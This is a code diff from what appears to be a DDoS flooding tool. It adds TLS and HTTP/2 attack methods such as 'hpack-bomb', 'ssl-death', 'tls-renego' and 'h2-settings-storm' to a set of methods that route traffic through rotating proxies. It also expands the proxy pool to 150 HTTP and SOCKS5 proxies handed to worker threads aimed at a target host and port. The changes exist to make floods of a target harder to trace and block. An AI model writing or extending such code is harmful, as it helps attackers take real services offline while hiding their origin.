@@ -98,7 +98,13 @@ async function runL3Simulation(
 // ─────────────────────────────────────────────────────────────────────────
 //  SPAWN POOL — spawns numWorkers workers for a single method
 // ─────────────────────────────────────────────────────────────────────────
-const HTTP_PROXY_METHODS = new Set(["http-flood", "http-bypass", "http-pipeline"]);
+const HTTP_PROXY_METHODS = new Set([
+  // HTTP-layer methods (always used proxies)
+  "http-flood", "http-bypass", "http-pipeline",
+  // TLS/H2 methods — now support HTTP CONNECT proxy tunnel
+  "http2-continuation", "hpack-bomb", "ssl-death", "tls-renego",
+  "conn-flood", "ws-flood", "h2-settings-storm",
+]);
 
 function spawnPool(
   method: string, target: string, port: number, threads: number,
@@ -107,9 +113,9 @@ function spawnPool(
   const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
   const workers: Worker[] = [];
   const workerConns = new Array<number>(numWorkers).fill(0);
-  // Pass top 100 fastest proxies to HTTP workers for rotation
+  // Pass top 150 fastest proxies (HTTP + SOCKS5) to workers for rotation
   const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
-    ? proxyCache.slice(0, 100).map(p => ({ host: p.host, port: p.port }))
+    ? proxyCache.slice(0, 150).map(p => ({ host: p.host, port: p.port, type: p.type as "http" | "socks5" | undefined }))
     : [];
 
   return new Promise<void>((resolve) => {
